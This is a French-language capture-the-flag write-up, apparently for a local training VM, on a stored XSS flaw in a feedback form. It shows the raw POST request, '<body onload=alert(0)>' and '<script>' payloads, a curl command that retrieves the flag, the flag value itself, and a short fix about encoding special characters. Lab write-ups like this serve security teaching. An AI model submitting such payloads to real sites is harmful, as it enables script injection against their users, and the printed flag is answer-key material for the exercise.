# XSS stored injection

## Exploitation

Sur la page `?page=feedback:` on peut voir un formulaire pour laisser un feedback ce mesage apres avoir ete submit s'affiche sans aucune verification dans la page elle meme. 

Requete:
http://192.168.122.55/?page=feedback
xss stored

request:

```
POST /?page=feedback HTTP/1.1
Host: 192.168.122.55
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://192.168.122.55
Connection: close
Referer: http://192.168.122.55/?page=feedback
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```

```
txtName=<body onload=alert(0)>&mtxtMessage=%3Cscript%3Ealert%280%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
```

En veritee pour l'exercice le flag s'obtiens seulement en marquant le terme "script" dans le champ message.
Pour obtenir une reelle XSS on utiliseras un onload dans le champ Name.

Avec curl :

```bash
$> curl 'http://192.168.99.100/?page=feedback' --data 'txtName=%3Cbody+onlo&mtxtMessage=%3Cbody+onload%3Dalert%280%29%3E+script&btnSign=Sign+Guestbook' | grep flag

The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

## Resolution

Pour eviter ce type de failles on preferas encoder les caracteres speciaux 

 ---- Never Trust User Input ----
